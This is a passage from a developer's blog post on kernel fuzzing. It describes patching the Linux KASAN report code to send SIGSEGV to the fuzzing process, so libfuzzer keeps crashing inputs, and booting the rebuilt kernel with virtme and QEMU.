<p>Initially, I explored alternative methods to notify the fuzzer about the panic. However, I opted to simulate <code class="language-plaintext highlighter-rouge">SIGSEGV</code> and dispatch a signal to libfuzzer whenever a kasan panic occurs in the kernel. Upon receiving this signal, libfuzzer will preserve the sample and terminate.
so we have to modify the linux kernel and build it once more.
add <code class="language-plaintext highlighter-rouge">send_sigsegv_to_process</code> function to <code class="language-plaintext highlighter-rouge">print_error_description</code> in <code class="language-plaintext highlighter-rouge">/mm/kasan/report.c</code>.</p>

<p>make sure</p>
<ul>
  <li>kernel.panic_on_warn=0</li>
  <li>kernel.panic_on_oops=0</li>
</ul>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;linux/sched/signal.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/sched.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;asm/siginfo.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">send_sigsegv_to_process</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span>  <span class="n">access_addr</span> <span class="p">);</span>
<span class="kt">void</span> <span class="nf">send_sigsegv_to_process</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span>  <span class="n">access_addr</span> <span class="p">)</span> <span class="p">{</span>

        <span class="n">kernel_siginfo_t</span> <span class="n">info</span><span class="p">;</span>
        <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">info</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kernel_siginfo_t</span><span class="p">));</span>
        <span class="n">info</span><span class="p">.</span><span class="n">si_signo</span> <span class="o">=</span> <span class="n">SIGSEGV</span><span class="p">;</span>  <span class="c1">// Signal type</span>
        <span class="n">info</span><span class="p">.</span><span class="n">si_pid</span> <span class="o">=</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">;</span>  <span class="c1">// Process ID to send the signal to</span>
        <span class="n">info</span><span class="p">.</span><span class="n">si_code</span> <span class="o">=</span> <span class="n">SEGV_MAPERR</span><span class="p">;</span>   <span class="c1">// Signal code for a memory access error</span>
        <span class="n">info</span><span class="p">.</span><span class="n">si_addr</span> <span class="o">=</span> <span class="n">access_addr</span><span class="p">;</span>          <span class="c1">// Address that caused the fault</span>
        <span class="n">send_sig_info</span><span class="p">(</span><span class="n">SIGSEGV</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">info</span><span class="p">,</span> <span class="n">current</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="n">print_error_description</span><span class="p">(</span><span class="k">struct</span> <span class="nc">kasan_report_info</span> <span class="o">*</span><span class="n">info</span><span class="p">)</span>
<span class="p">{</span>

        <span class="n">send_sigsegv_to_process</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">info</span><span class="o">-&gt;</span><span class="n">access_addr</span><span class="p">);</span>

        <span class="n">pr_err</span><span class="p">(</span><span class="s">"BUG: KASAN: %s in %pS</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">info</span><span class="o">-&gt;</span><span class="n">bug_type</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">info</span><span class="o">-&gt;</span><span class="n">ip</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">info</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">!=</span> <span class="n">KASAN_REPORT_ACCESS</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">pr_err</span><span class="p">(</span><span class="s">"Free of addr %px by task %s/%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
                        <span class="n">info</span><span class="o">-&gt;</span><span class="n">access_addr</span><span class="p">,</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">comm</span><span class="p">,</span> <span class="n">task_pid_nr</span><span class="p">(</span><span class="n">current</span><span class="p">));</span>
                <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">info</span><span class="o">-&gt;</span><span class="n">access_size</span><span class="p">)</span>
                <span class="n">pr_err</span><span class="p">(</span><span class="s">"%s of size %zu at addr %px by task %s/%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
                        <span class="n">info</span><span class="o">-&gt;</span><span class="n">is_write</span> <span class="o">?</span> <span class="s">"Write"</span> <span class="o">:</span> <span class="s">"Read"</span><span class="p">,</span> <span class="n">info</span><span class="o">-&gt;</span><span class="n">access_size</span><span class="p">,</span>
                        <span class="n">info</span><span class="o">-&gt;</span><span class="n">access_addr</span><span class="p">,</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">comm</span><span class="p">,</span> <span class="n">task_pid_nr</span><span class="p">(</span><span class="n">current</span><span class="p">));</span>
        <span class="k">else</span>
                <span class="n">pr_err</span><span class="p">(</span><span class="s">"%s at addr %px by task %s/%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
                        <span class="n">info</span><span class="o">-&gt;</span><span class="n">is_write</span> <span class="o">?</span> <span class="s">"Write"</span> <span class="o">:</span> <span class="s">"Read"</span><span class="p">,</span>
                        <span class="n">info</span><span class="o">-&gt;</span><span class="n">access_addr</span><span class="p">,</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">comm</span><span class="p">,</span> <span class="n">task_pid_nr</span><span class="p">(</span><span class="n">current</span><span class="p">));</span>
<span class="p">}</span></code></pre></figure>

<p>copy libprotobuf example binary to testfuzz. now you can boot the new kernel and run the fuzzer with</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nb">cd </span>linux
 ../virtme/virtme-run <span class="nt">--kimg</span> <span class="nb">arch</span>/x86/boot/bzImage <span class="nt">--rwdir</span> ../testfuzz/ <span class="nt">--qemu-opts</span>  <span class="nt">-m</span> 2G <span class="nt">-smp</span> 2 <span class="nt">-enable-kvm</span></code></pre></figure>

<p>The next step involves incorporating APIs and system calls into the proto file and ensuring they are included in the <code class="language-plaintext highlighter-rouge">DEFINE_PROTO_FUZZER</code>. This will enable the ability to fuzz additional subsystems within the Linux kernel.</p>]]></content><author><name></name></author><category term="fuzzing" /><summary type="html"><![CDATA[Hi everyone! I’m really happy to tell you about my experimenting adventure today. I decided to experiment with KCOV and see how I can hook it into libfuzzer and boot the kernel without spending too much on building a root file system.]]></summary></entry></feed>